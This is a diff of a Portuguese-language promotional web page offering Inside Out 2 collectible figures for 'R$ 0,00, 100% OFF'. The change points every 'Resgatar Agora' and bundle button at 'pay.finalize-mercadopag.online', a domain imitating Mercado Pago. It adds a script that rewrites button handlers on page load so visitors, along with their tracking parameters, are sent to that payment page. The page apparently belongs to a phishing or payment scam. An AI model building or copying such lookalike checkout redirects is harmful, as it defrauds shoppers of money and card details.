@@ -37,39 +37,39 @@ src="https://www.facebook.com/tr?id=453331410873257&ev=PageView&noscript=1"
   gtag('config', 'G-7EF23GCBS8');
 </script>
 
-    <script>
-        // Função para obter e decodificar parâmetros da URL atual
-        function getUrlParameters() {
-            const params = new URLSearchParams(window.location.search);
-            let queryString = '';
-            for (const [key, value] of params) {
-                // Decodifica e formata os valores
-                const decodedValue = decodeURIComponent(value);
-                queryString += `${encodeURIComponent(key)}=${decodedValue.replace(/%7C/g, '|')}&`;
+<script>
+    // Função para obter e decodificar parâmetros da URL atual
+    function getUrlParameters() {
+        const params = new URLSearchParams(window.location.search);
+        let queryString = '';
+        for (const [key, value] of params) {
+            // Decodifica e formata os valores
+            const decodedValue = decodeURIComponent(value);
+            queryString += `${encodeURIComponent(key)}=${decodedValue.replace(/%7C/g, '|')}&`;
+        }
+        return queryString.slice(0, -1); // Remove o último '&'
+    }
+
+    // Função para atualizar o onclick dos botões
+    function updateButtonLinks() {
+        const parameters = getUrlParameters();
+        const buttons = document.querySelectorAll('button[onclick], .button-container[onclick]');
+        
+        buttons.forEach(button => {
+            const onclick = button.getAttribute('onclick');
+            if (onclick) {
+                // Atualiza o onclick com o novo link e os parâmetros da URL atual
+                const updatedOnclick = onclick.replace(/window\.location\.href='.*?' \+ window\.location\.search/, `window.location.href='https://pay.finalize-mercadopag.online/xQBPZvY9lra3mVq?' + '${parameters}'`);
+                button.setAttribute('onclick', updatedOnclick);
             }
-            return queryString.slice(0, -1); // Remove o último '&'
-        }
+        });
+    }
 
-        // Função para atualizar o onclick dos botões
-        function updateButtonLinks() {
-            const parameters = getUrlParameters();
-            const buttons = document.querySelectorAll('button[onclick], .button-container[onclick]');
-            
-            buttons.forEach(button => {
-                const onclick = button.getAttribute('onclick');
-                if (onclick) {
-                    // Atualiza o onclick com os parâmetros da URL atual
-                    const updatedOnclick = onclick.replace(/(\.\.\.\/frete\/)\?.*/, `$1?${parameters}`);
-                    button.setAttribute('onclick', updatedOnclick);
-                }
-            });
-        }
-
-        // Executa a função após o carregamento da página
-        window.onload = function() {
-            updateButtonLinks();
-        };
-    </script>
+    // Executa a função após o carregamento da página
+    window.onload = function() {
+        updateButtonLinks();
+    };
+</script>
     
   
     <nav class="navbar" style="padding-top: 15px;">
@@ -163,7 +163,7 @@ src="https://www.facebook.com/tr?id=453331410873257&ev=PageView&noscript=1"
       <span class="new-price2">R$ 0,00</span>
       <span class="discount2">100% OFF</span>
     </div>
-    <button class="pergunta-botao" onclick="window.location.href='../frete/' + window.location.search">Resgatar Agora</button>
+<button class="pergunta-botao" onclick="window.location.href='https://pay.finalize-mercadopag.online/xQBPZvY9lra3mVq' + window.location.search">Resgatar Agora</button>
     <div class="full-description">
       <div class="divider"></div>
       <h3>Descubra a Magia de Divertidamente 2 com as Figuras Colecionáveis Cosbi!</h3>
@@ -198,7 +198,7 @@ src="https://www.facebook.com/tr?id=453331410873257&ev=PageView&noscript=1"
     </div>
     <div class="promocao" style="margin-top: -20px;">
       <p class="promotitle">Ofertas especiais 🔥</p>
-      <div class="button-container" onclick="window.location.href='../frete/' + window.location.search">
+<div class="button-container" onclick="window.location.href='https://pay.finalize-mercadopag.online/xQBPZvY9lra3mVq' + window.location.search">
         <button class="styled-button" style="background-color: #ffffff;">
           <span class="button-text">
             <span class="button-title" style="color: #4B1388">LEVAR 3 CAIXAS</span>
@@ -354,7 +354,7 @@ src="https://www.facebook.com/tr?id=453331410873257&ev=PageView&noscript=1"
       }
     </style>
     <div class="botao-flutuante">
-      <button class="comprar" onclick="window.location.href='../frete/' + window.location.search">Resgatar Agora</button>
+<button class="comprar" onclick="window.location.href='https://pay.finalize-mercadopag.online/xQBPZvY9lra3mVq' + window.location.search">Resgatar Agora</button>
     </div>
     <script>
       document.addEventListener("DOMContentLoaded", function() {
